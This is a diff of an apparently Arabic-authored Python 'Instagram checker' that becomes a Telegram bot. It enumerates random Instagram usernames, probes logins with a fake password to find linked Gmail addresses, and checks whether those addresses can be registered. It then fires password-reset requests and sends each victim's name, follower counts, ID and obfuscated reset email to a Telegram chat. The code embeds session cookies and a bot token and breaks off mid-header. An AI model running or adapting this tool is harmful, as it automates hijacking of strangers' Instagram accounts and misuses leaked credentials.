@@ -1,261 +1,180 @@
-import random,requests,time;from uuid import uuid4;uui,uid= uuid4(),uuid4();from rich.console import Console;from rich.table import Table;from user_agent import generate_user_agent;import threading;from AegosPy import GetInfoInsta
-######L7N#####
-O = '\x1b[38;5;208m' #برتقالي
-R = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-F = '\033[2;32m' #اخضر
-C = "\033[1;97m" #ابيض
-B = '\033[2;36m'#سمائي
-K = '\033[2;35m'
-C1 = '\033[2;35m'
-B = '\033[2;36m'#سمائي
-######L7N#####
-print(C1+' ')
-table = Table(title="TooL cHecker instagram v3",style="red")
-table.add_column("এ〔 𝗍𝗁𝖾 𝗍𝗈𝗈𝗅 𝖻𝗒 : 𝖺𝖻𝗈𝗈𝖽 𝗒𝖺𝖻𝗁 〕",style='green')
-table.add_row("এ〔 𝗆𝗒 𝗎𝗌𝖾𝗋 : @m_aBd 〕",style='green')
-console = Console()
-console.print(table)
-L7n = Console()
-tok = input('EnTeR ToKeN : ')
-print('\n')
-iD = input('EnTeR iD : ')
-print('  '*15)
-with L7n.status(F+'wait YaBh !  ',spinner_style='point'):
-        time.sleep(2.5);requests.post(f"https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&video=https://t.me/i6273/8&caption=")
-print('             '*10)
-def L7Ngmail(email):	
-	url =  'https://i.instagram.com/api/v1/accounts/login/'
-	headers = { 'Accept': '*/*',
-'Accept-Encoding': 'gzip, deflate',
-'Accept-Language': 'en-US',
-'X-IG-Capabilities': '3brTvw==',
-'X-IG-Connection-Type': 'WIFI',
-'Host': 'i.instagram.com',
-'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-'User-Agent':'Instagram 114.0.0.0.41 Android (30/3.0; 240dpi; 1242x2688; huawei/google; samsung; angler; angler; en_US)',
-'Cookie': 'missing' }
-	data = {'uuid':uid,  'password':'@L7NFurry',
-              'username':email,
-              'device_id':uid,
-              'from_reg':'false',
-              '_csrftoken':'missing',
-              'login_attempt_countn':'0'}
-	req= requests.post(url, headers=headers, data=data).json()
-	if req['message'] == 'The password you entered is incorrect. Please try again.':
-		email = email+'@gmail.com'
-		print(X+f'Available Insta  : [{email}]')
-		url1 = 'https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=82313&rt=j'
-		headers1 = {
-            'Accept':'*/*',
-            'Accept-Encoding':'gzip, deflate, br',
-            'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
-            'Content-Length':'2012',
-            'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
-            'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; __Secure-3PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; 1P_JAR=2023-9-24-19; __Host-GAPS=1:iFhDk8pCf_rD1y3_iK2rTNHPPXyeFdUNSUjVgFZCL3Ltep11xrrj3uMllHFN7PihHvMGMTJMk7wzsbxtkkxqQ_UwnvxmvQ:vzp7p_rGftukpa7K; SIDCC=APoG2W89V3Dj40h3I70mlxHqCsOnBqi1Y1IrqdrZ28s11C3oE9Cgl3AFna_0iqMulMurcnIZUAI; __Secure-1PSIDCC=APoG2W-pHOrjlyneewhmwgzwCclUzrXhQKOfz0m4R3IyzCDXjIeFlwOQibw94fcCWMCApPTYxlc; __Secure-3PSIDCC=APoG2W8sda3Sda4T54ef6cME8uLFklJ3FfAkNIEevAOou3ZHau6ityTVjk9n4Bb7qiCEFhiNyw',
-            'Google-Accounts-Xsrf':'1',
-            'Origin':'https://accounts.google.com',
-            'Referer':'https://accounts.google.com/signup/v2/createaccount?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp',
-            'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-            'Sec-Ch-Ua-Arch':'"x86"',
-            'Sec-Ch-Ua-Bitness':'"64"',
-            'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
-            'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
-            'Sec-Ch-Ua-Mobile':'?0',
-            'Sec-Ch-Ua-Model':'""',
-            'Sec-Ch-Ua-Platform':'"Windows"',
-            'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
-            'Sec-Ch-Ua-Wow64':'?0',
-            'Sec-Fetch-Dest':'empty',
-            'Sec-Fetch-Mode':'cors',
-            'Sec-Fetch-Site':'same-origin',
-            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
-            'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
-            'X-Same-Domain':'1'
-            }
-		data1 = {
-            'theme': 'glif',
-            'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-            'f.req': '["AEThLlzavccs_MdaDMBDfSU7NEeTKr02URa8Y9GAk-2d5ygvEJv1okzAOPzpFw_rFw7MwSmg0m4SxVvZNNMz97nf2-NlwAlseWtZSAdlgAwoVzJaYtv-tuezCMXj8lHpLGDJbv2PEVTDn47o79z30klv1McaYIuuIW8xRVelt4tQ3jbscrpSkCTv7cT5a5A3FvaQISHBljEF",null,null,null,null,0,0,"strrgrs","strrgrs","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
-            'at': 'AFoagUUzkiOnQaoRtzNNCpQ0ha9o8tIkSQ:1695585059018',
-            'azt': 'AFoagUUi89PpEd8CL8NrG88__muZtPuD_w:1695585059018',
-            'cookiesDisabled': 'false',
-            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-            'gmscoreversion': 'undefined',
-            'flowName': 'GlifWebSignIn',
-            'checkConnection': 'youtube:290:0',
-            'checkedDomains': 'youtube',
-            'pstMsg': '1',
-            }
+import requests
+from time import sleep
+import telebot
+from telebot import types
+import time
+import random
+from uuid import uuid4
+import json
+import os
+j=0
+v=0
+h=0
+vv=0
+cc=0
+us=0
+bb="QWERTYUIOPLKJHGFDSAZXCVBNM0987654321qwhghnbhnbmm"
+token = "6762979530:AAG5DMNhpKxJC7ITbrPd-1qI-QzF4k7su4w"
+os.system('clear')
+bot = telebot.TeleBot(token)
+@bot.message_handler(commands=['start'])
+def start(message):
+    START = types.InlineKeyboardButton(text ="Click Start", callback_data = 'START')
+    maac = types.InlineKeyboardMarkup()
+    maac.row_width = 1
+    maac.add(START)
+    bot.send_message(message.chat.id,text=f"Welcome To BoT Checker Hunt v3 🇮🇶",parse_mode="markdown",reply_markup=maac)
+@bot.callback_query_handler(func=lambda call: True)
+def clase(call):
+	if call.data=='START':
+		ref= types.InlineKeyboardButton(text ="Click Start To Check!", callback_data = 'ref')
+		maac2= types.InlineKeyboardMarkup()
+		maac2.row_width = 2
+		maac2.add(ref)
+		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"*hi in Bot aBooD 🇮🇶\n\n@kckkkkc*",parse_mode="markdown",reply_markup=maac2)
+	if call.data=="ref":
+		 	cansl = types.InlineKeyboardButton(text =" Back ", callback_data = 'START')
+		 	Keyy = types.InlineKeyboardMarkup()
+		 	Keyy.row_width = 1
+		 	Keyy.add(cansl)
+		 	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* Send Now (Bot)\n\n@kckkkkc*",parse_mode="markdown",reply_markup=Keyy)
+		 	@bot.message_handler(func=lambda m:True )
+		 	def com(message):
+					user=message.text
+					global bb,vv,cc,v,h,us,j
+					message = call.message
+					while True:
+					   #number= random.choice(ok)
+					   username = str(''.join(random.choice(bb)for i in range(7))).lower()
+					   url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
+					   head11 = {
+		        'accept': '*/*',
+		        'accept-encoding': 'gzip, deflate, br',
+		        'accept-language': 'en-US,en;q=0.9',
+		       # 'content-length': '336',
+		#        'content-type': 'application/x-www-form-urlencoded',
+		        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',
+		       # 'origin': 'https://www.instagram.com',
+		        'referer': 'https://www.instagram.com/explore/search/',
+		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
+		        'sec-ch-ua-mobile': '?0',
+		        'sec-fetch-dest': 'empty',
+		        'sec-fetch-mode': 'cors',
+		        'sec-fetch-site': 'same-origin',
+		        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
+		        'x-asbd-id': '437806',
+		        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
+		        'x-ig-app-id': '936619743392459',
+		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
+		        #x-requested-with': 'caee87137ae9',
+		        'x-requested-with': 'XMLHttpRequest'
+					   }
+					   data2={
+		        	'context': 'blended',
+		        	'query': '{}'.format(username),
+		        	'rank_token': '0.38549261586414585',
+		        	'include_reel': 'true'
+					   }
+					   y= requests.get(url,headers=head11).json()
+					   try:
+					    iddd = len(str(y['users'][0]['user']['pk']))
+					    for ll in range(0,iddd):
+					    	try:
+					    			nn = str(y['users'][ll]['user']['username'])
+					    			print(nn)
+					    			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+					    			headers = {'User-Agent': 'Instagram 136.0.0.34.124 Android (24/5.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US)'}
+					    			uid = str(uuid4())
+					    			data = {
+			'uuid':uid, 
+			'password':'ffffdddddaaa666', 
+			'username':'{}@gmail.com' .format(nn),
+			'device_id':uid, 
+			'from_reg':'false', 
+			'_csrftoken':'missing', 
+			'login_attempt_countn':'0'
+					    			}
+					    			re = requests.post(url,headers=headers,data=data).text
+					    			
+					    				
+					    			if ('"bad_password"') in re:
+					    				url3 ='https://android.clients.google.com/setup/checkavail'
+					    				headers = {
+	        		'Content-Length':'98',
+	        		'Content-Type':'text/plain; charset=UTF-8',
+	        		'Host':'android.clients.google.com',
+	        		'Connection':'Keep-Alive',
+	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
+					    				data= json.dumps({
+	        		'username':'{}@gmail.com'.format(nn),
+	        		'version':'3',
+	        		'firstName':'AbaLahb',
+	        		'lastName':'AbuJahl'
+					    				})
+					    				res=requests.post(url3,headers=headers,data=data)
+					    				if res.json()['status'] =='SUCCESS':
+					    					
+					    					h+=1
+					    					r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={nn}").json()
+					    					try:
+					    						
+						    					nam= r['name']
+						    					fols=r['following']
+						    					fol =r['followers']
+						    					post=r['post']
+						    					id= r['id']
+						    				except KeyError as error:
+						    					us+=1
+					    					rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+					    					ree = rl.json()
+					    					da = ree['date']
+					    					headers = {
+        # 'Content-Length': '305',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com',
+        'Connection': 'Keep-Alive',
+        'User-Agent': 'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',
+        # Requests sorts cookies= alphabetically
 
-		re = requests.post(url1,headers=headers1,data=data1).text
-		TLL = re.split('["gf.ttu",null,"')[1].split('"],')[0]
+        'Accept-Language': 'en-US',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': 'AQ==',
+        # 'Accept-Encoding': 'gzip',
+					    					}
+					    					data = {
+        'ig_sig_key_version': '4',
+        "user_id":id
+					    					}
+					    					res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
+					    					rs =str(res['obfuscated_email'])
+					    					j+=1
 
-		url2 = ('https://accounts.google.com/_/signup/validatebasicinfo?hl=ar&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv&_reqid=283689&rt=j')
+					    					msg=f"Hi Sir!! </> : {j}\nএ〔 𝗇𝖺𝗆𝖾 〕: {nam}\nএ〔 𝖾𝗆𝖺𝗂𝗅 〕: {nn}@gmail.com\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 〕: {fols}\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 〕: {fol}\nএ〔 𝗉𝗈𝗌𝗍 〕: {post}\nএ〔 𝖽𝖺𝗍𝖾 〕: {da}\n𝗂𝖣 : {id}\n𝖱𝖾𝗌𝗍 : {rs}\n@kckkkkc"
+					    					
+					    					bot.send_message(message.chat.id, msg)
+					    				elif res.json()['status'] =='USERNAME_UNAVAILABLE':
+					    					cc+=1
+					    			elif('"invalid_user"')in re:
+														vv+=1
+														aac = types.InlineKeyboardMarkup()
+														aac.row_width = 2
+														i12= types.InlineKeyboardButton(text =f"𓏺 𝖡𝖺𝖣 𝖦𝗆𝖺𝗂𝖫 | {cc} ", callback_data = 'c')
+														i1= types.InlineKeyboardButton(text =f"𝖡𝖺𝖣 𝖨𝗇𝗌𝗍𝖺𝖦𝗋𝖺𝗆 | {vv}", callback_data = 'c')
+														i11= types.InlineKeyboardButton(text =f"𝖣𝗈𝖭𝖾 | {h}", callback_data = 'c')
+														i7= types.InlineKeyboardButton(text =f"𓏺 𝖤𝗋𝖱𝗈𝖱 𝗎𝖲𝖾𝖱𝗇𝖺𝖬𝖾 | {us}", callback_data = 'c')
+														aac.add(i12,i1,i11,i7)
+														bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="""Done Start Now""", reply_markup=aac)
+					    	except IndexError as error:
+					    		
+					    		
+					    		continue
+					    
+					   except IndexError as error:
+					    continue
+while True:
+	try:
+		bot.polling(none_stop=True)
+	except Exception as e:
+	       print(e)
+	       sleep(10)			    	
 
-		headers2 = {
-            'Accept':'*/*',
-            'Accept-Encoding':'gzip, deflate, br',
-            'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
-            'Content-Length':'1243',
-            'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
-            'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; __Secure-3PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; 1P_JAR=2023-9-24-20; __Host-GAPS=1:NH4ff_ca85MbS_Oy22i-HVW9z7iTfoC9f7WpMXewN1CAIy7lv2A8Gkt1Cn3h1lGFzfpwVNpa4KbEeoNpa3f01hkIR9dV8w:ucYsdrNQRlvj2wLH; SIDCC=APoG2W_i5paMflXBUncC2H4tWKnnYlb6EN8mJavQ5QD7I6Boz_mPhgHHY5atNHEaKvXASATVAq0; __Secure-1PSIDCC=APoG2W_CSoBIIpl_-YgzWNDlpF2az6b6WUUQbUlsvAmYyDP5wN7c17Nwcrn3MGeapKh-8jf7Pc8; __Secure-3PSIDCC=APoG2W-cSJNfs98t1YDG74w8iT6WSDBWGSXUJ_FuzxeBgEaVPZxxcpMwxlY2RUMvCXd-erQ4Dw',
-            'Google-Accounts-Xsrf':'1',
-            'Origin':'https://accounts.google.com',
-            'Referer':'https://accounts.google.com/signup/v2/birthdaygender?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv',
-            'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-            'Sec-Ch-Ua-Arch':'"x86"',
-            'Sec-Ch-Ua-Bitness':'"64"',
-            'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
-            'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
-            'Sec-Ch-Ua-Mobile':'?0',
-            'Sec-Ch-Ua-Model':'""',
-            'Sec-Ch-Ua-Platform':'"Windows"',
-            'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
-            'Sec-Ch-Ua-Wow64':'?0',
-            'Sec-Fetch-Dest':'empty',
-            'Sec-Fetch-Mode':'cors',
-            'Sec-Fetch-Site':'same-origin',
-            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
-            'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
-            'X-Same-Domain':'1'
-            }
-
-		data2 = {
-            'theme': 'glif',
-            'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-            'f.req': f'["TL:{TLL}",1999,3,6,2,null,null,0,null,null,0,0]',
-            'at': 'AFoagUXYUhTvUEnQe3grDoZb22BYTBUXFg:1695586462543',
-            'azt': 'AFoagUWQYD1CqlgiVRQg71n710QgPsx-jA:1695586462544',
-            'cookiesDisabled': 'false',
-            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-            'gmscoreversion': 'undefined',
-            'flowName': 'GlifWebSignIn',
-            'checkConnection': 'youtube:486:0',
-            'checkedDomains': 'youtube',
-            'pstMsg': '1'
-            }
-
-		re2 = requests.post(url2,headers=headers2,data=data2).text
-
-		TLL2 = re2.split('["gf.bgvr",1,0,0,"TL:')[1].split('",null,null,0,24,null,null,0],["e",2,null,null,146]]]')[0]
-
-
-		link = 'https://accounts.google.com/_/signup/usernameavailability?&rt=j'
-
-		headers= {
-            'accept':'*/*',
-            'accept-encoding':'gzip, deflate',
-            'accept-language':'en-US,en;q=0.8,ar;q=0.6',
-            'content-length':'973',
-            'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
-            'cookie':f'OGP=-19019112:; OGPC=19019112-2:; AEC=Ackid1S23dF7bQM-_0OCQUIMAxlJT6UQ7kJ67WfjoZ4GR9QaUf7nVUGeS98; NID=511=Teo8xCZ02OFPC6FlYoX2um01GIrlb9UR6NBlG6aZT8_y7C5LKgyCDGnoyjWE1qCa6NDN4zolWTDuGmj_6xSFi4SY3sZ5sgL3NVVKdRvkQKaQQw6WF8KRVX-tB9FNWgPqI481IQ4td0TNIF4WBsgd1G-X_WwJLirnjZOMXMBwNiqHl8LzQrQRcQ; 1P_JAR=2023-09-23-19; __Host-GAPS=1:AI0Jr4suRW2V3Z9AJ_EHrOfuj8g1ow:j6tbQfvXA0_99rgx',
-            'google-accounts-xsrf':'1',
-            'origin':'https://accounts.google.com',
-            'referer':'https://accounts.google.com/signup/v2/createusername?cc=IQ&dsh=S1929428821%3A1695499162771291&flowEntry=SignUp&flowName=GlifWebSignIn&hl=cy&ifkv=AYZoVhenrpZ4woEGqcGC8b6wc0PTEMJO_NmcsMrtUsh7wxI_uhZTz5NeS4keAc-QbkZv0DohSw4lmw&theme=glif&TL=AJeL0C76qwBDDsftUiC9xtxwA5EvN8ZC3FCHKjox9S3I2XkubvAQfYlgYI0jpKvL',
